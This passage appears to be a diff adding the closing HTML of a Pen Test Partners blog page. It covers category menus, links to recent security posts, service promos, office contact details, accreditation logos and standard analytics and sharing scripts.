+	<option class="level-0" value="11">How-Tos&nbsp;&nbsp;(264)</option>
+	<option class="level-0" value="39">In the news&nbsp;&nbsp;(1)</option>
+	<option class="level-0" value="38">Internet Of Things&nbsp;&nbsp;(169)</option>
+	<option class="level-0" value="16">Macs / Apple&nbsp;&nbsp;(31)</option>
+	<option class="level-0" value="50">Maritime Cyber Security&nbsp;&nbsp;(47)</option>
+	<option class="level-0" value="75">Medical Device Security&nbsp;&nbsp;(3)</option>
+	<option class="level-0" value="14">Opinions&nbsp;&nbsp;(107)</option>
+	<option class="level-0" value="76">OPSEC&nbsp;&nbsp;(9)</option>
+	<option class="level-0" value="49">OT, ICS, IIoT, SCADA&nbsp;&nbsp;(22)</option>
+	<option class="level-0" value="18">Passwords&nbsp;&nbsp;(39)</option>
+	<option class="level-0" value="61">PCI Advice&nbsp;&nbsp;(2)</option>
+	<option class="level-0" value="67">Ransomware&nbsp;&nbsp;(2)</option>
+	<option class="level-0" value="55">Red Teaming&nbsp;&nbsp;(26)</option>
+	<option class="level-0" value="13">Reverse Engineering&nbsp;&nbsp;(12)</option>
+	<option class="level-0" value="5">Security Blog&nbsp;&nbsp;(808)</option>
+	<option class="level-0" value="22">Shameless Self Promotion&nbsp;&nbsp;(11)</option>
+	<option class="level-0" value="31">Show on homepage&nbsp;&nbsp;(6)</option>
+	<option class="level-0" value="24">Social Engineering&nbsp;&nbsp;(12)</option>
+	<option class="level-0" value="66">Sustainability&nbsp;&nbsp;(2)</option>
+	<option class="level-0" value="23">Virtual Environments&nbsp;&nbsp;(1)</option>
+	<option class="level-0" value="69">Vulnerabilities that aren&#8217;t&nbsp;&nbsp;(4)</option>
+	<option class="level-0" value="45">Vulnerability Advisory&nbsp;&nbsp;(45)</option>
+	<option class="level-0" value="68">Vulnerability Disclosure&nbsp;&nbsp;(20)</option>
+</select>
+
+                <noscript>
+                    <input type="submit"
+                           value="View"/>
+                </noscript>
+
+            </form>
+
+        </div>
+
+        <div class="widget_recent-blogs">
+
+            <div class="bg-red">
+                <a href="/blog/">
+                    <div class="block-text cta-block">
+                        <h1>See the other cool stuff we've been doing&hellip;</h1>
+                    </div>
+                </a>
+            </div>
+
+			
+			
+				
+				
+
+                <div class="bg-image bg-">
+                    <a href="https://www.pentestpartners.com/security-blog/the-unexpected-effects-of-gps-spoofing-on-aviation-safety/"
+                       rel="nofollow">
+						                            <div class="block-bg"
+                                 style="background-image: url(https://www.pentestpartners.com/content/uploads/2025/01/unexpectedGPSspoofing-headline.png);"></div>
+						                        <div class="block-text">
+                            <p class="meta">Aviation Cyber Security</p>
+                            <h1>The unexpected effects of GPS spoofing on aviation safety</h1>
+                            <p class="date">09 Jan 2025</p>
+                        </div>
+                    </a>
+                </div>
+
+			
+				
+				
+
+                <div class="bg-image bg-">
+                    <a href="https://www.pentestpartners.com/security-blog/10-non-tech-things-you-wish-you-had-done-after-being-breached/"
+                       rel="nofollow">
+						                            <div class="block-bg"
+                                 style="background-image: url(https://www.pentestpartners.com/content/uploads/2022/12/afterbreachtop10-headline.png);"></div>
+						                        <div class="block-text">
+                            <p class="meta">DFIR</p>
+                            <h1>10 Non-tech things you wish you had done after being breached</h1>
+                            <p class="date">07 Jan 2025</p>
+                        </div>
+                    </a>
+                </div>
+
+			
+				
+				
+
+                <div class="bg-image bg-">
+                    <a href="https://www.pentestpartners.com/security-blog/the-surprising-existence-of-the-erase-button-on-cockpit-voice-recorders/"
+                       rel="nofollow">
+						                            <div class="block-bg"
+                                 style="background-image: url(https://www.pentestpartners.com/content/uploads/2022/12/cockpitvoicerecorder-headline.png);"></div>
+						                        <div class="block-text">
+                            <p class="meta">Aviation Cyber Security</p>
+                            <h1>The surprising existence of the erase button on cockpit voice recorders</h1>
+                            <p class="date">03 Jan 2025</p>
+                        </div>
+                    </a>
+                </div>
+
+			
+				
+				
+
+                <div class="bg-image bg-">
+                    <a href="https://www.pentestpartners.com/security-blog/heels-on-fire-hacking-smart-ski-socks/"
+                       rel="nofollow">
+						                            <div class="block-bg"
+                                 style="background-image: url(https://www.pentestpartners.com/content/uploads/2024/12/smartskisocks-headline.png);"></div>
+						                        <div class="block-text">
+                            <p class="meta">Internet Of Things</p>
+                            <h1>Heels on fire. Hacking smart ski socks</h1>
+                            <p class="date">23 Dec 2024</p>
+                        </div>
+                    </a>
+                </div>
+
+			
+				
+				
+
+                <div class="bg-image bg-">
+                    <a href="https://www.pentestpartners.com/security-blog/practice-being-punched-in-the-face-the-realities-of-incident-response-preparation/"
+                       rel="nofollow">
+						                            <div class="block-bg"
+                                 style="background-image: url(https://www.pentestpartners.com/content/uploads/2024/12/incidentresponsepunchface-headline.png);"></div>
+						                        <div class="block-text">
+                            <p class="meta">DFIR</p>
+                            <h1>Practice being punched in the face. The realities of incident response preparation</h1>
+                            <p class="date">20 Dec 2024</p>
+                        </div>
+                    </a>
+                </div>
+
+			
+
+        </div>
+
+		
+        <div class="widget bg-image ptp-uber_widget bg-green">
+            <a href="https://www.pentestpartners.com/penetration-testing-services/automotive-and-iot-testing/"
+               target="_self">
+                <div class="block-bg"
+                     style="background-image: url(https://www.pentestpartners.com/content/uploads/2016/11/ACsolder.png);"></div>
+                <div class="block-text">
+                    <p class="meta">Services</p>
+                    <h3>Automotive &#038; IoT Testing</h3>
+                </div>
+                <p class="cta">Find out more »</p>
+            </a>
+        </div>
+
+		<div class="widget bg-image  ptp-uber_widget grid-item col2 row2 bg-grey"><a href="" target="_self"><div class="block-bg" style="background-image: url(https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/home-people.jpg);"></div><div class="block-text"><h3>Our People</h3><p class="excerpt">Being introduced to, and getting to know your tester is an often overlooked part of the process. Yes, our work is über technical, but faceless relationships do nobody any good.</p></div></a></div>
+	
+
+
+	
+
+	    <div id="sidebar-spacer"></div>
+</aside>
+
+
+
+    </section>
+
+
+
+    <section id="hot-topics--footer">
+
+        <article>
+            <a href="https://www.pentestpartners.com/penetration-testing-services/suffered-a-security-breach/">
+                <img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-alert.svg"/>
+                <h2>Suffered a Security breach?</h2>
+            </a>
+        </article>
+        <article>
+            <a href="https://www.pentestpartners.com/penetration-testing-services/mobile-security/">
+                <img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-mobile-security.svg"/>
+                <h2>Mobile Security</h2>
+            </a>
+        </article>
+        <article>
+            <a href="https://www.pentestpartners.com/penetration-testing-services/social-engineering/">
+                <img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-social-engineering-grey.svg"/>
+                <h2>Social Engineering</h2>
+            </a>
+        </article>
+        <article>
+            <a href="https://www.pentestpartners.com/penetration-testing-services/web-application-testing/">
+                <img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-webapp.svg"/>
+                <h2>Web application testing</h2>
+            </a>
+        </article>
+		 <article class="grid-item">
+       	<a href="https://www.pentestpartners.com/penetration-testing-services/security-consulting/"
+         	class="row1">
+            	<img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-data-compliance-grey.svg"/>
+	            <h2>Security Consuting</h2>
+   	     </a>
+    	</article>
+    	<article class="grid-item">
+        <a href="https://www.pentestpartners.com/penetration-testing-services/papa/"
+           class="row1">
+            <img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-papa-grey.svg"/>
+            <h2>Papa - PTP Advance Password Auditor</h2>
+        </a>
+    </article>
+
+    </section>
+
+
+</div>
+</div>
+
+<footer id="site-footer">
+
+    <div class="container">
+
+        <div id="contact">
+            <div id="get-in-touch"
+                 class="grid-item bg-grey-dark">
+					<div>
+						<h3>Get in touch</h3>
+						<p class="address">
+                       <strong class="office">UK Office:</strong><br />
+                       Pen Test Partners LLP<br />
+                       Unit 2, Verney Junction Business Park<br>
+                       Buckingham<br>
+                       MK18 2LB<br>
+                       United Kingdom
+						</p>
+						<a class="phone" href="tel:+442030950500">+44 20 3095 0500</a>
+
+						<a class="form" href="/contact-us/">Contact Us &raquo;</a>
+					</div>
+					<div>
+						<h3>&nbsp;</h3>
+                  <p class="address-us">
+                        <strong class="office">US Office:</strong><br />
+                        Pen Test Partners Inc.<br />
+                        222 Broadway 22nd Floor, Suite 2525<br />
+                        New York<br />
+                        NY 10038<br />
+                        United States
+                  </p>
+						<a class="phone" href="tel:+16466932501">+1 646 693 2501</a>
+
+						<a class="email" href="/cdn-cgi/l/email-protection#a5cccbc3cae5d5c0cbd1c0d6d1d5c4d7d1cbc0d7d68bc6cac8"><span class="__cf_email__" data-cfemail="2b42454d446b5b4e455f4e585f5b4a595f454e595805484446">[email&#160;protected]</span></a>
+				</div>
+<!--
+                <div>
+                    <h3>Get in touch</h3>
+                    <div>
+                        <a class="phone"
+                           href="tel:+442030950500">+44 20 3095 0500</a>
+                        <a class="phone"
+                           href="tel:+16466932501">+1 646 693 2501</a>
+                        <a class="email"
+                           href="mailto:info@pentestpartners.com">info@pentestpartners.com</a>
+                        <a class="form"
+                           href="/contact-us/">Contact Us &raquo;</a>
+                    </div>
+                </div>
+                <div>
+                    <p class="address">
+                        Unit 2, Verney Junction Business Park<br>
+                        Verney Junction<br>
+                        Buckingham<br>
+                        MK18 2LB<br>
+                        United Kingdom
+                    </p>
+                    <p class="address-us">
+								Pen Test Partners Inc.<br />
+								222 Broadway 22nd Floor, Suite 2525<br />
+								New York<br />
+								NY 10038<br />
+								United States
+                    </p>
+                </div>
+-->
+            </div>
+            <div id="connect"
+                 class="grid-item bg-green">
+                <div>
+                    <h3>Connect</h3>
+                    <a href="https://twitter.com/PentestPartners"
+                       class="twitter"
+                       target="_blank"><i class="fab fa-twitter"></i>Twitter</a>
+                    <a href="https://www.linkedin.com/company/pen-test-partners"
+                       class="linkedin"
+                       target="_blank"><i class="fab fa-linkedin"></i>LinkedIn</a>
+                    <a href="https://www.youtube.com/channel/UC2HCAhj6JiOsV_PcMFrjykw"
+                       class="youtube"
+                       target="_blank"><i class="fab fa-youtube"></i>YouTube</a>
+                </div>
+            </div>
+        </div>
+
+        <div id="accreditations">
+            <div class="grid-item">
+                <div>
+                    <a href="https://www.crest-approved.org/member_companies/pen-test-partners/" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-logo-22.png"></a>
+                </div>
+				</div>
+            <div class="grid-item">
+                <div>
+                    <a href="https://www.crest-approved.org/member_companies/pen-test-partners/" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-pentest-logo-22.png"></a>
+                </div>
+            </div>
+            <div class="grid-item">
+                <div>
+                    <a href="https://www.crest-approved.org/member_companies/pen-test-partners/" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-star-logo-22.png"></a>
+                </div>
+            </div>
+            <div class="grid-item">
+                <div>
+                    <a href="https://www.crest-approved.org/member_companies/pen-test-partners/" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-star-fs-logo-22.png"></a>
+                </div>
+            </div>
+            <div class="grid-item">
+                <div>
+                    <a href="https://www.crest-approved.org/member_companies/pen-test-partners/" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/csir-logo-22.png"></a>
+                </div>
+            </div>
+            <div class="grid-item">
+                <div>
+                    <a href="https://www.crest-approved.org/member_companies/pen-test-partners/" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-ovs-logo-22.png"></a>
+                </div>
+            </div>
+        </div>
+
+        <div id="accreditations">
+            <div class="grid-item">
+                <div>
+                    <a href="https://www.crest-approved.org/member_companies/pen-test-partners/"
+                       rel="nofollow"
+                       target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-cbest.png"
+                                            alt="logo-cbest"></a>
+                </div>
+            </div>
+            <div class="grid-item">
+                <div>
+                    <a href="https://www.ncsc.gov.uk/organisations/pen-test-partners" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-check-ncsc.png"></a>
+                </div>
+            </div>
+            <div class="grid-item">
+                <div>
+                    <a href="https://www.crest-approved.org/member_companies/pen-test-partners/" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-assure.png"></a>
+                </div>
+            </div>
+            <div class="grid-item">
+                <div>
+                    <a href="https://iasme.co.uk/cyber-essentials/" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-cyber-essentials2023.png"></a>
+                </div>
+            </div>
+            <div class="grid-item">
+                <div>
+                    <a href="/content/uploads/2023/12/PTP-ISO27001-Certificate-2023.pdf" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/bsi-iso27001-logo-22.png"></a>
+                </div>
+            </div>
+            <div class="grid-item">
+                <div>
+                    <a href="https://www.pcisecuritystandards.org/assessors_and_solutions/qualified_security_assessors" rel="nofollow" target="_blank"><img src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-pci-certified.png"></a>
+                </div>
+            </div>
+        </div>
+        <div id="copyright">
+            <div>
+                <p><a href="/privacy-policy/">Privacy Policy</a></p>
+                <p><a href="/terms-of-website-use/">Terms of Service</a></p>
+					 <p><a onclick="displayPreferenceModal()">Manage Cookies</a></p>
+            </div>
+            <div>
+                <p>Company number: OC353362</p>
+                <p>VAT reg number: GB825526427</p>
+                <p>&copy; 2025 Pen Test Partners</p>
+            </div>
+        </div>
+
+    </div>
+
+</footer>
+
+		<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+		( function ( body ) {
+			'use strict';
+			body.className = body.className.replace( /\btribe-no-js\b/, 'tribe-js' );
+		} )( document.body );
+		</script>
+		<script> /* <![CDATA[ */var tribe_l10n_datatables = {"aria":{"sort_ascending":": activate to sort column ascending","sort_descending":": activate to sort column descending"},"length_menu":"Show _MENU_ entries","empty_table":"No data available in table","info":"Showing _START_ to _END_ of _TOTAL_ entries","info_empty":"Showing 0 to 0 of 0 entries","info_filtered":"(filtered from _MAX_ total entries)","zero_records":"No matching records found","search":"Search:","all_selected_text":"All items on this page were selected. ","select_all_link":"Select all pages","clear_selection":"Clear Selection.","pagination":{"all":"All","next":"Next","previous":"Previous"},"select":{"rows":{"0":"","_":": Selected %d rows","1":": Selected 1 row"}},"datepicker":{"dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"dayNamesMin":["S","M","T","W","T","F","S"],"monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesShort":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesMin":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"nextText":"Next","prevText":"Prev","currentText":"Today","closeText":"Done","today":"Today","clear":"Clear"}};/* ]]> */ </script>		<!-- Google Tag Manager (noscript) snippet added by Site Kit -->
+		<noscript>
+			<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5CQ6NHF5" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+		</noscript>
+		<!-- End Google Tag Manager (noscript) snippet added by Site Kit -->
+		<script type="text/javascript" id="addtoany-core-js-before">
+/* <![CDATA[ */
+window.a2a_config=window.a2a_config||{};a2a_config.callbacks=[];a2a_config.overlays=[];a2a_config.templates={};a2a_localize = {
+	Share: "Share",
+	Save: "Save",
+	Subscribe: "Subscribe",
+	Email: "Email",
+	Bookmark: "Bookmark",
+	ShowAll: "Show All",
+	ShowLess: "Show less",
+	FindServices: "Find service(s)",
+	FindAnyServiceToAddTo: "Instantly find any service to add to",
+	PoweredBy: "Powered by",
+	ShareViaEmail: "Share via email",
+	SubscribeViaEmail: "Subscribe via email",
+	BookmarkInYourBrowser: "Bookmark in your browser",
+	BookmarkInstructions: "Press Ctrl+D or \u2318+D to bookmark this page",
+	AddToYourFavorites: "Add to your favourites",
+	SendFromWebOrProgram: "Send from any email address or email program",
+	EmailProgram: "Email program",
+	More: "More&#8230;",
+	ThanksForSharing: "Thanks for sharing!",
+	ThanksForFollowing: "Thanks for following!"
+};
+/* ]]> */
+</script>
+<script type="text/javascript" async src="https://static.addtoany.com/menu/page.js" id="addtoany-core-js"></script>
+<script type="text/javascript" async src="https://www.pentestpartners.com/content/plugins/add-to-any/addtoany.min.js?ver=1.1" id="addtoany-jquery-js"></script>
+<script type="text/javascript" id="ptp-js-js-extra">
+/* <![CDATA[ */
+var ajax_url = "https:\/\/www.pentestpartners.com\/wp-admin\/admin-ajax.php";
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/main.js?id=685b9096a5cb2d5d2c37&amp;ver=1" id="ptp-js-js"></script>
+<script type="text/javascript" src="https://www.pentestpartners.com/content/plugins/lazy-load/js/jquery.sonar.min.js?ver=0.6.1" id="jquery-sonar-js"></script>
+<script type="text/javascript" src="https://www.pentestpartners.com/content/plugins/lazy-load/js/lazy-load.js?ver=0.6.1" id="wpcom-lazy-load-images-js"></script>
+
+<!-- Google tag (gtag.js) snippet added by Site Kit -->
+
+<!-- Google Analytics snippet added by Site Kit -->
+<script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=GT-NMLD95V" id="google_gtagjs-js" async></script>
+<script type="text/javascript" id="google_gtagjs-js-after">
+/* <![CDATA[ */
+window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
+gtag("set","linker",{"domains":["www.pentestpartners.com"]});
+gtag("js", new Date());
+gtag("set", "developer_id.dZTNiMT", true);
+gtag("config", "GT-NMLD95V");
+/* ]]> */
+</script>
+
+<!-- End Google tag (gtag.js) snippet added by Site Kit -->
+
+</body>
+</html>
